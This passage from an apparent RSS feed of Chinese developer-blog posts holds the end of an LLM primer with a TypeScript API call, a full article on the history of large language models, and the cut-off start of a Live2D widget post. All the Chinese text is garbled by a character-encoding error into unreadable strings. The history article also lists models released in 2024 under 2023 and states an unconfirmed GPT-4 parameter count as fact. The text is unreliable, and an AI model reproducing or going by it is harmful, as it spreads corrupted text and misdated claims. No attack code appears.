</code></pre>
<p><strong>æµ‹è¯• 2ï¼šç²¾ç¡®è®¡ç®—</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">ç”¨æˆ·: "12345 Ã— 67890 = ï¼Ÿ"</span>
<span class="hljs-section">LLM: "å¤§çº¦æ˜¯ 83,000,000 å·¦å³"</span>
<span class="hljs-section">å®é™…: 838,102,050</span>
</code></pre>
<p><strong>æµ‹è¯• 3ï¼šçŸ¥è¯†æˆªæ­¢</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">ç”¨æˆ·: <span class="hljs-string">"è°èµ¢å¾—äº†2024å¹´å¥¥è¿ä¼šï¼Ÿ"</span>
<span class="hljs-symbol">LLM:</span> <span class="hljs-string">"æŠ±æ­‰ï¼Œæˆ‘çš„çŸ¥è¯†æˆªæ­¢åˆ°2023å¹´..."</span>
</code></pre>
<p><strong>è§£æ</strong>ï¼šè¿™äº›æµ‹è¯•æ­ç¤ºäº† LLM çš„ä¸‰å¤§å±€é™â€”â€”çŸ¥è¯†æˆªæ­¢ã€å¹»è§‰é—®é¢˜ã€æ— æ³•è®¿é—®å®æ—¶ä¿¡æ¯ã€‚</p>
<h3 data-id="heading-10">æ¡ˆä¾‹ 4ï¼šå®é™…é¡¹ç›®ä¸­çš„è°ƒç”¨</h3>
<p>åœ¨æœ¬é¡¹ç›®çš„åç«¯ä»£ç ä¸­ï¼ŒLLM è°ƒç”¨æ˜¯è¿™æ ·å®ç°çš„ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-title function_">chat</span>(<span class="hljs-params">request: {
  question: <span class="hljs-built_in">string</span>;    // ç”¨æˆ·çš„é—®é¢˜
  model: <span class="hljs-built_in">string</span>;       // ä½¿ç”¨çš„æ¨¡å‹ï¼ˆå¦‚ qwen-plusï¼‰
  apiKey: <span class="hljs-built_in">string</span>;      // API å¯†é’¥
}</span>) {
  <span class="hljs-comment">// è°ƒç”¨é˜¿é‡Œäº‘ç™¾ç‚¼çš„ LLM</span>
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(
    <span class="hljs-string">'https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions'</span>,
    {
      <span class="hljs-attr">model</span>: request.<span class="hljs-property">model</span>,
      <span class="hljs-attr">messages</span>: [{ <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: request.<span class="hljs-property">question</span> }]
    }
  );

  <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>.<span class="hljs-property">content</span>;
}
</code></pre>
<p><strong>è§£æ</strong>ï¼šé€šè¿‡ HTTP API è°ƒç”¨ï¼Œå°†ç”¨æˆ·é—®é¢˜å‘é€ç»™ LLMï¼Œè·å–ç”Ÿæˆçš„å›å¤ã€‚</p>
<hr/>
<h2 data-id="heading-11">æ€»ç»“</h2>
<ol>
<li><strong>LLM æ˜¯æ–‡å­—æ¥é¾™æœºå™¨</strong>â€”â€”æ ¸å¿ƒåŸç†æ˜¯é¢„æµ‹ä¸‹ä¸€ä¸ªè¯</li>
<li><strong>LLM æœ‰å¼ºå¤§ä½†æœ‰é™çš„èƒ½åŠ›</strong>â€”â€”ç†è§£ã€ç”Ÿæˆã€æ¨ç†ã€å­¦ä¹ éƒ½å¾ˆå¼ºï¼Œä½†å¹¶éä¸‡èƒ½</li>
<li><strong>LLM çš„çŸ¥è¯†æ¥è‡ªè®­ç»ƒæ•°æ®</strong>â€”â€”å®ƒå­¦ä¹ çš„æ˜¯æ¨¡å¼å’Œè§„å¾‹ï¼Œè€Œéç®€å•è®°å¿†</li>
<li><strong>LLM ä¼šçŠ¯é”™</strong>â€”â€”å¹»è§‰ã€çŸ¥è¯†æˆªæ­¢ã€è®¡ç®—ä¸ç²¾ç¡®æ˜¯å¸¸è§é—®é¢˜</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¤§æ¨¡å‹å‘å±•å²-01]]></title>    <link>https://juejin.cn/post/7600986252449234984</link>    <guid>https://juejin.cn/post/7600986252449234984</guid>    <pubDate>2026-01-30T15:01:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600986252449234984" data-draft-id="7600799940971724840" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¤§æ¨¡å‹å‘å±•å²-01"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-30T15:01:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€è¯ºæ»šé›ªçƒ"/> <meta itemprop="url" content="https://juejin.cn/user/2824015112318094"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¤§æ¨¡å‹å‘å±•å²-01
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2824015112318094/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€è¯ºæ»šé›ªçƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:01:41.000Z" title="Fri Jan 30 2026 15:01:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>2017å¹´ï¼Œä¸€ç¯‡è®ºæ–‡æ‚„ç„¶å‘è¡¨ï¼Œé¢˜ä¸ºã€ŠAttention Is All You Needã€‹ã€‚</p>
<p>å½“æ—¶æ²¡äººé¢„æ–™åˆ°ï¼Œè¿™ç¯‡è®ºæ–‡ä¸­æå‡ºçš„ Transformer æ¶æ„ï¼Œä¼šåœ¨çŸ­çŸ­å‡ å¹´å†…å½»åº•æ”¹å˜äººå·¥æ™ºèƒ½çš„æ ¼å±€ã€‚</p>
<p>äº”å¹´åçš„2022å¹´11æœˆ30æ—¥ï¼ŒChatGPT å‘å¸ƒã€‚äº”å¤©å†…ï¼Œç”¨æˆ·çªç ´100ä¸‡ã€‚ä¸¤ä¸ªæœˆå†…ï¼Œç”¨æˆ·çªç ´1äº¿ã€‚</p>
<p>è¿™æ˜¯äº’è”ç½‘å†å²ä¸Šå¢é•¿æœ€å¿«çš„åº”ç”¨ï¼Œä¹Ÿæ˜¯äººå·¥æ™ºèƒ½å‘å±•å²ä¸Šçš„é‡è¦é‡Œç¨‹ç¢‘ã€‚</p>
<p>ä»é»˜é»˜æ— é—»åˆ°å¸­å·å…¨çƒï¼Œå¤§è¯­è¨€æ¨¡å‹ç»å†äº†æ€æ ·çš„è¿›åŒ–ä¹‹è·¯ï¼Ÿè®©æˆ‘ä»¬ä¸€èµ·å›é¡¾è¿™æ®µæ¿€åŠ¨äººå¿ƒçš„æŠ€æœ¯æ¼”è¿›å²ã€‚</p>
<hr/>
<h2 data-id="heading-1">1. ä»€ä¹ˆæ˜¯ Transformer</h2>
<p><strong>Transformer</strong> æ˜¯ä¸€ç§å®Œå…¨åŸºäºæ³¨æ„åŠ›æœºåˆ¶çš„ç¥ç»ç½‘ç»œæ¶æ„ï¼Œäº2017å¹´ç”± Google å›¢é˜Ÿæå‡ºã€‚</p>
<h3 data-id="heading-2">æ ¸å¿ƒåˆ›æ–°</h3>





















<table><thead><tr><th>ç‰¹ç‚¹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>Self-Attention</strong></td><td>è‡ªæ³¨æ„åŠ›æœºåˆ¶ï¼Œæ•æ‰é•¿è·ç¦»ä¾èµ–</td></tr><tr><td><strong>å¹¶è¡Œè®¡ç®—</strong></td><td>å¯å¹¶è¡Œè®­ç»ƒï¼Œå¤§å¹…æå‡æ•ˆç‡</td></tr><tr><td><strong>å¯æ‰©å±•æ€§</strong></td><td>ä¸ºåç»­å¤§æ¨¡å‹å¥ å®šåŸºç¡€</td></tr></tbody></table>
<h3 data-id="heading-3">æ ¸å¿ƒæ€æƒ³</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Transformer çš„æ ¸å¿ƒï¼šSelf-Attention</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Transformer</span> {
  <span class="hljs-title function_">attention</span>(<span class="hljs-params">Q, K, V</span>) {
    <span class="hljs-comment">// Q (Query)ã€K (Key)ã€V (Value)</span>
    <span class="hljs-keyword">const</span> scores = Q @ K.<span class="hljs-property">T</span> / <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(d_k);  <span class="hljs-comment">// è®¡ç®—æ³¨æ„åŠ›åˆ†æ•°</span>
    <span class="hljs-keyword">const</span> weights = <span class="hljs-title function_">softmax</span>(scores);           <span class="hljs-comment">// å½’ä¸€åŒ–</span>
    <span class="hljs-keyword">return</span> weights @ V;                        <span class="hljs-comment">// åŠ æƒæ±‚å’Œ</span>
  }
}
</code></pre>
<h3 data-id="heading-4">é‡è¦æœ¯è¯­</h3>

























<table><thead><tr><th>æœ¯è¯­</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><strong>é¢„è®­ç»ƒ</strong></td><td>ç”¨å¤§é‡æ— æ ‡æ³¨æ•°æ®è®­ç»ƒåŸºç¡€æ¨¡å‹</td></tr><tr><td><strong>å¾®è°ƒ</strong></td><td>é’ˆå¯¹ç‰¹å®šä»»åŠ¡ç”¨å°æ•°æ®é›†ä¼˜åŒ–æ¨¡å‹</td></tr><tr><td><strong>RLHF</strong></td><td>äººç±»åé¦ˆå¼ºåŒ–å­¦ä¹ ï¼Œå¯¹é½äººç±»åå¥½</td></tr><tr><td><strong>å°‘æ ·æœ¬å­¦ä¹ </strong></td><td>åªéœ€å‡ ä¸ªä¾‹å­å°±èƒ½å­¦ä¼šæ–°ä»»åŠ¡</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-5">2. æ¡ˆä¾‹</h2>
<h3 data-id="heading-6">æ¡ˆä¾‹ 1ï¼šGPT ç³»åˆ—çš„è¿›åŒ–ä¹‹è·¯</h3>
<p>è®©æˆ‘ä»¬çœ‹çœ‹ GPT ç³»åˆ—æ˜¯å¦‚ä½•ä¸€æ­¥æ­¥è¿›åŒ–çš„ï¼š</p>















































<table><thead><tr><th>ä»£é™…</th><th>å‘å¸ƒæ—¶é—´</th><th>å‚æ•°é‡</th><th>èƒ½åŠ›çªç ´</th></tr></thead><tbody><tr><td>GPT-1</td><td>2018.06</td><td>117M</td><td>é¢„è®­ç»ƒèŒƒå¼</td></tr><tr><td>GPT-2</td><td>2019.02</td><td>1.5B</td><td>é›¶æ ·æœ¬ç”Ÿæˆ</td></tr><tr><td>GPT-3</td><td>2020.05</td><td>175B</td><td>å°‘æ ·æœ¬å­¦ä¹ </td></tr><tr><td>GPT-3.5</td><td>2022.11</td><td>æœªçŸ¥</td><td>å¯¹è¯èƒ½åŠ›</td></tr><tr><td>GPT-4</td><td>2023.03</td><td>~1.7T</td><td>å¤šæ¨¡æ€+æ¨ç†</td></tr><tr><td>GPT-4o</td><td>2024.05</td><td>æœªçŸ¥</td><td>åŸç”Ÿå¤šæ¨¡æ€</td></tr></tbody></table>
<p><strong>å…³é”®çªç ´ï¼šGPT-3 çš„å°‘æ ·æœ¬å­¦ä¹ </strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> prompt = <span class="hljs-string">`
ç¿»è¯‘ä»¥ä¸‹å¥å­æˆä¸­æ–‡ï¼š
Example 1: Hello world -&gt; ä½ å¥½ä¸–ç•Œ
Example 2: How are you -&gt; ä½ å¥½å—
Input: Good morning -&gt; ?
`</span>;
<span class="hljs-comment">// GPT-3: æ—©ä¸Šå¥½</span>
<span class="hljs-comment">// æ²¡æœ‰ä¸“é—¨è®­ç»ƒï¼Œå°±èƒ½å­¦ä¼šç¿»è¯‘ä»»åŠ¡</span>
</code></pre>
<h3 data-id="heading-7">æ¡ˆä¾‹ 2ï¼šChatGPT çš„ AI iPhone æ—¶åˆ»</h3>
<p><strong>å‘å¸ƒæ—¶é—´</strong>ï¼š2022å¹´11æœˆ30æ—¥</p>
<p><strong>çªç ´æ€§æ”¹è¿›</strong>ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">è®­ç»ƒæµç¨‹ï¼š
<span class="hljs-bullet">1.</span> é¢„è®­ç»ƒï¼ˆå­¦ä¹ çŸ¥è¯†ï¼‰
   â†“
<span class="hljs-bullet">2.</span> æœ‰ç›‘ç£å¾®è°ƒï¼ˆå­¦ä¹ æŒ‡ä»¤ï¼‰
   â†“
<span class="hljs-bullet">3.</span> å¥–å¥–æ¨¡å‹ï¼ˆå­¦ä¹ äººç±»åå¥½ï¼‰
   â†“
<span class="hljs-bullet">4.</span> å¼ºåŒ–å­¦ä¹ ï¼ˆä¼˜åŒ–è¾“å‡ºï¼‰
</code></pre>
<p><strong>æˆæœ</strong>ï¼š</p>
<ul>
<li>å¯¹è¯èƒ½åŠ›å¤§å¹…æå‡</li>
<li>æŒ‡ä»¤éµå¾ªèƒ½åŠ›å¼º</li>
<li>å¤šè½®å¯¹è¯æµç•…</li>
<li>5å¤©ç”¨æˆ·ç ´100ä¸‡</li>
</ul>
<h3 data-id="heading-8">æ¡ˆä¾‹ 3ï¼š2023å¹´ç™¾èŠ±é½æ”¾</h3>
<p><strong>é—­æºæ¨¡å‹ä¸‰å¼ºé¼ç«‹</strong>ï¼š</p>

























<table><thead><tr><th>æ¨¡å‹</th><th>å…¬å¸</th><th>æ ¸å¿ƒä¼˜åŠ¿</th></tr></thead><tbody><tr><td>GPT-4</td><td>OpenAI</td><td>å¤šæ¨¡æ€ã€æ¨ç†èƒ½åŠ›å¼º</td></tr><tr><td>Claude 3</td><td>Anthropic</td><td>è¶…é•¿ä¸Šä¸‹æ–‡(200K)</td></tr><tr><td>Gemini</td><td>Google</td><td>åŸç”Ÿå¤šæ¨¡æ€</td></tr></tbody></table>
<p><strong>å¼€æºæ¨¡å‹å¿«é€Ÿè¿½èµ¶</strong>ï¼š</p>





























<table><thead><tr><th>æ¨¡å‹</th><th>ç»„ç»‡</th><th>å‚æ•°</th><th>ç‰¹ç‚¹</th></tr></thead><tbody><tr><td>Llama 3</td><td>Meta</td><td>8B/70B</td><td>æ€§èƒ½å¼ºåŠ²</td></tr><tr><td>Qwen</td><td>é˜¿é‡Œäº‘</td><td>7B/14B/72B</td><td>ä¸­æ–‡ä¼˜ç§€</td></tr><tr><td>Mistral</td><td>Mistral AI</td><td>7B</td><td>æ•ˆç‡ä¹‹ç‹</td></tr></tbody></table>
<p><strong>ä¸­å›½å¤§æ¨¡å‹å´›èµ·</strong>ï¼š</p>






























<table><thead><tr><th>æ¨¡å‹</th><th>å…¬å¸</th><th>ç‰¹è‰²</th></tr></thead><tbody><tr><td>æ–‡å¿ƒä¸€è¨€</td><td>ç™¾åº¦</td><td>çŸ¥è¯†å›¾è°±å¢å¼º</td></tr><tr><td>é€šä¹‰åƒé—®</td><td>é˜¿é‡Œäº‘</td><td>å¼€æºå‹å¥½</td></tr><tr><td>è®¯é£æ˜Ÿç«</td><td>ç§‘å¤§è®¯é£</td><td>è¯­éŸ³èƒ½åŠ›å¼º</td></tr><tr><td>DeepSeek</td><td>å¹»æ–¹é‡åŒ–</td><td>æ€§ä»·æ¯”é«˜</td></tr></tbody></table>
<h3 data-id="heading-9">æ¡ˆä¾‹ 4ï¼š2024å¹´çš„ä¸‰å¤§è¶‹åŠ¿</h3>
<p><strong>è¶‹åŠ¿1ï¼šå¼€æºæ¨¡å‹è¿½å¹³é—­æº</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-number">2024</span><span class="hljs-string">å¹´åˆï¼šLlama</span> <span class="hljs-number">2</span> <span class="hljs-string">70B</span> <span class="hljs-string">â‰ˆ</span> <span class="hljs-string">GPT-3.5</span>
<span class="hljs-number">2024</span><span class="hljs-string">å¹´ä¸­ï¼šLlama</span> <span class="hljs-number">3</span> <span class="hljs-string">70B</span> <span class="hljs-string">æ¥è¿‘</span> <span class="hljs-string">GPT-4</span>
<span class="hljs-number">2024</span><span class="hljs-string">å¹´åº•ï¼šQwen</span> <span class="hljs-number">2.5</span><span class="hljs-string">ã€DeepSeek</span> <span class="hljs-string">V3</span> <span class="hljs-string">è¿½å¹³é—­æº</span>
</code></pre>
<p><strong>è¶‹åŠ¿2ï¼šå¤šæ¨¡æ€æˆä¸ºæ ‡é…</strong></p>
<ul>
<li>GPT-4oï¼šåŸç”Ÿå¤šæ¨¡æ€</li>
<li>Claude 3.5ï¼šå¼ºå¤§çš„è§†è§‰èƒ½åŠ›</li>
<li>Geminiï¼šä»ä¸€å¼€å§‹å°±æ˜¯å¤šæ¨¡æ€</li>
</ul>
<p><strong>è¶‹åŠ¿3ï¼šæ™ºèƒ½ä½“æŠ€æœ¯æˆç†Ÿ</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Agent èƒ½åŠ›çš„è¿›åŒ–</span>
<span class="hljs-number">2022</span>ï¼šç®€å•å¯¹è¯
<span class="hljs-number">2023</span>ï¼šå·¥å…·è°ƒç”¨
<span class="hljs-number">2024</span>ï¼š
  â”œâ”€â”€ å¤æ‚ä»»åŠ¡è§„åˆ’
  â”œâ”€â”€ å¤šæ™ºèƒ½ä½“åä½œ
  â”œâ”€â”€ è‡ªä¸»å­¦ä¹ å’Œæ”¹è¿›
  â””â”€â”€ çœŸæ­£çš„<span class="hljs-string">"AI å‘˜å·¥"</span>
</code></pre>
<hr/>
<h2 data-id="heading-10">æ€»ç»“</h2>
<ol>
<li><strong>è§„æ¨¡å³è´¨é‡</strong>â€”â€”æ›´å¤§çš„æ¨¡å‹é€šå¸¸è¡¨ç°æ›´å¥½</li>
<li><strong>æ•°æ®æ˜¯å…³é”®</strong>â€”â€”é«˜è´¨é‡è®­ç»ƒæ•°æ®è‡³å…³é‡è¦</li>
<li><strong>æ¶æ„åˆ›æ–°</strong>â€”â€”Transformer æ˜¯æ ¸å¿ƒçªç ´</li>
<li><strong>å¼€æºåŠ é€Ÿ</strong>â€”â€”å¼€æºæ¨¡å‹æ¨åŠ¨æŠ€æœ¯æ™®åŠ</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºç½‘é¡µæ³¨å…¥çµé­‚ï¼šLive2D Widgetçœ‹æ¿å¨˜ï¼Œæ‰“é€ ä¼šåŠ¨çš„äº’åŠ¨ä¼™ä¼´ï¼]]></title>    <link>https://juejin.cn/post/7601169987395174451</link>    <guid>https://juejin.cn/post/7601169987395174451</guid>    <pubDate>2026-01-30T15:01:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601169987395174451" data-draft-id="7600953879501226035" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºç½‘é¡µæ³¨å…¥çµé­‚ï¼šLive2D Widgetçœ‹æ¿å¨˜ï¼Œæ‰“é€ ä¼šåŠ¨çš„äº’åŠ¨ä¼™ä¼´ï¼"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-30T15:01:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¿®å·±xj"/> <meta itemprop="url" content="https://juejin.cn/user/2641475936724142"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºç½‘é¡µæ³¨å…¥çµé­‚ï¼šLive2D Widgetçœ‹æ¿å¨˜ï¼Œæ‰“é€ ä¼šåŠ¨çš„äº’åŠ¨ä¼™ä¼´ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2641475936724142/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¿®å·±xj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:01:41.000Z" title="Fri Jan 30 2026 15:01:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body 